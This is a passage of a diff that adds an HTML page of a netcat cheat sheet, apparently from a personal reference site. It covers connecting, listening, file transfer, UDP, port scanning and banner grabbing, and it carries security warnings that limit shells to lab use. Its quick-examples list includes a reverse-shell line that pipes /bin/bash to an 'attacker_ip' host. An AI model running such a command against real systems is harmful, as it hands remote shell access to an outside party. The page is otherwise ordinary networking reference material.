+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">openssl</span><span style="color: light-dark(#032F62, #9ECBFF);"> s_client</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">connect</span><span style="color: light-dark(#032F62, #9ECBFF);"> server:8443</span></span></code></pre>
+<hr />
+<h2 id="warning-security-best-practices">⚠️ Security &amp; best practices<a class="zola-anchor" href="#warning-security-best-practices" aria-label="Anchor link for: warning-security-best-practices">🔗</a></h2>
+<ul>
+<li>Never run reverse/bind shells against systems you don’t own or have permission to test.</li>
+<li>Prefer secure alternatives (SSH, mutual TLS).</li>
+<li>Modern <code>nc</code> variants may restrict dangerous options (<code>-e</code>). Use <code>socat</code> for more advanced, secure setups.</li>
+<li>Be aware of firewall/NAT behaviors — they may block or translate ports.</li>
+</ul>
+<hr />
+<h2 id="troubleshooting-tips">� Troubleshooting tips<a class="zola-anchor" href="#troubleshooting-tips" aria-label="Anchor link for: troubleshooting-tips">🔗</a></h2>
+<ul>
+<li>If <code>-e</code> is missing, check your <code>nc</code> version (<code>nc --version</code> or <code>man nc</code>).</li>
+<li>Use <code>-vv</code> to increase verbosity for debugging.</li>
+<li>For firewall issues, verify with <code>iptables -L</code> / Windows Firewall rules.</li>
+<li>For file transfer issues, confirm no intermediate device is altering stream (anti-virus, proxies).</li>
+</ul>
+<hr />
+<h2 id="references-further-reading">� References / further reading<a class="zola-anchor" href="#references-further-reading" aria-label="Anchor link for: references-further-reading">🔗</a></h2>
+<ul>
+<li><code>man nc</code> (your system)</li>
+<li>Ncat (from Nmap): https://nmap.org/ncat/</li>
+<li><code>socat</code> documentation for advanced piping and forwarding.</li>
+</ul>
+<hr />
+<h2 id="white-check-mark-quick-examples-cheat-list">✅ Quick examples cheat list<a class="zola-anchor" href="#white-check-mark-quick-examples-cheat-list" aria-label="Anchor link for: white-check-mark-quick-examples-cheat-list">🔗</a></h2>
+<pre class="giallo" style="color: light-dark(#24292E, #E1E4E8); background-color: light-dark(#FFFFFF, #24292E);" ><code data-lang="shellscript"><span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Simple connect</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> example.com</span><span style="color: light-dark(#005CC5, #79B8FF);"> 80</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Simple listen</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 1234</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> File send (server)</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &lt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.gz</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> File receive (client)</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> server_ip</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#D73A49, #F97583);"> &gt;</span><span style="color: light-dark(#032F62, #9ECBFF);"> myfile.gz</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> UDP listen</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">u</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">l</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">p</span><span style="color: light-dark(#005CC5, #79B8FF);"> 9999</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Port scan</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">zv</span><span style="color: light-dark(#005CC5, #79B8FF);"> 192.168.1.1</span><span style="color: light-dark(#032F62, #9ECBFF);"> 20-1024</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Banner grab</span></span>
+<span class="giallo-l"><span style="color: light-dark(#005CC5, #79B8FF);">echo</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">e</span><span style="color: light-dark(#032F62, #9ECBFF);"> &quot;</span><span style="color: light-dark(#032F62, #9ECBFF);">HEAD / HTTP/1.0\r\n\r\n</span><span style="color: light-dark(#032F62, #9ECBFF);">&quot;</span><span style="color: light-dark(#D73A49, #F97583);"> |</span><span style="color: light-dark(#6F42C1, #B392F0);"> nc</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">nv</span><span style="color: light-dark(#032F62, #9ECBFF);"> example.com</span><span style="color: light-dark(#005CC5, #79B8FF);"> 80</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: light-dark(#6A737D, #6A737D);">#</span><span style="color: light-dark(#6A737D, #6A737D);"> Reverse shell (if supported)</span></span>
+<span class="giallo-l"><span style="color: light-dark(#6F42C1, #B392F0);">nc</span><span style="color: light-dark(#032F62, #9ECBFF);"> attacker_ip</span><span style="color: light-dark(#005CC5, #79B8FF);"> 4444</span><span style="color: light-dark(#005CC5, #79B8FF);"> -</span><span style="color: light-dark(#005CC5, #79B8FF);">e</span><span style="color: light-dark(#032F62, #9ECBFF);"> /bin/bash</span></span></code></pre>
+<hr />
+<p><em>End of cheat sheet.</em></p>
+
+  </div>
+
+  
+
+  
+    <nav class="siblings" aria-label="Pagination">
+      
+        <a class="siblings__link siblings__link--prev" href="https://upcreid.github.io/cheat-sheet/ansible/">
+          <span class="siblings__label">← Précédent</span>
+          <span class="siblings__title">Ansible</span>
+        </a>
+      
+      
+        <a class="siblings__link siblings__link--next" href="https://upcreid.github.io/cheat-sheet/curl/">
+          <span class="siblings__label">Suivant →</span>
+          <span class="siblings__title">curl</span>
+        </a>
+      
+    </nav>
+  
+
+  
+
+      </article>
+      
+  
+    <aside class="toc">
+      <nav class="toc__nav">
+        <p class="toc__title">Sur cette page</p>
+        <ul class="toc__list">
+          
+            <li class="toc__item">
+              <a href="#gear-basic-syntax">⚙️ Basic syntax</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#common-options-varies-by-implementation-gnu-netcat-openbsd-netcat-ncat">� Common options (varies by implementation: GNU netcat, OpenBSD netcat, Ncat)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#simple-client-connection">� Simple client connection</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#simple-server-chat-demo">�️ Simple server (chat/demo)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#file-transfer-tcp">� File transfer (TCP)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#udp-examples">� UDP examples</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#port-scanning-quick">� Port scanning (quick)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#banner-grabbing-service-detection">� Banner grabbing / service detection</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#reverse-shell-for-lab-testing-only">� Reverse shell (for lab/testing only)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#bind-shell-listen-on-target">� Bind shell (listen on target)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#port-forwarding-proxying-simple">� Port forwarding / proxying (simple)</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#misc-useful-commands">� Misc useful commands</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#warning-security-best-practices">⚠️ Security &amp; best practices</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#troubleshooting-tips">� Troubleshooting tips</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#references-further-reading">� References / further reading</a>
+              
+            </li>
+          
+            <li class="toc__item">
+              <a href="#white-check-mark-quick-examples-cheat-list">✅ Quick examples cheat list</a>
+              
+            </li>
+          
+        </ul>
+      </nav>
+    </aside>
+  
+
+    </div>
+  </main>
+  
+
+  <footer class="footer">
+    <div class="footer__inner">
+      <p class="footer__meta">/void ! — 2026</p>
+      
+        <a class="footer__link" href="https://github.com/upcreid/upcreid.github.io">GitHub</a>
+      
+      <a class="footer__link" href="https://upcreid.github.io/atom.xml">RSS</a>
+    </div>
+  </footer>
+
+  <script src="https://upcreid.github.io/js/main.js" defer></script>
+  <script src="https://upcreid.github.io/js/search.js" defer></script>
+  
+  
+  
+
+</body>
+</html>
